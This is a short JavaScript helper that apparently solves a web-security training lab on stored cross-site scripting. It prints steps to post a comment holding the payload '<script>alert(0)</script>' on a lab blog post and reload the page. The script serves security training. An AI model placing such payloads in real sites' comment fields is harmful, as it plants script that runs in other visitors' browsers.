import { getParsedInputFromUser } from "../../../utils/getParsedInputFromUser.js";
import { runTasks } from "../../../utils/runTasks.js";

const { labUrl } = getParsedInputFromUser({
  description: "Lab: Stored XSS into HTML context with nothing encoded",
});

function task() {
  const blogPostPath = "post?postId=1";
  const link = labUrl + blogPostPath;
  const payload = "<script>alert(0)</script>";
  console.log(`
To solve the lab:
  1. Visit this url:
  "${link}"
  2. Post a comment with this text:
  "${payload}"
  3. Click "Back to blog" or visit the blog post again:
  "${link}"
`);
}

runTasks([task]);
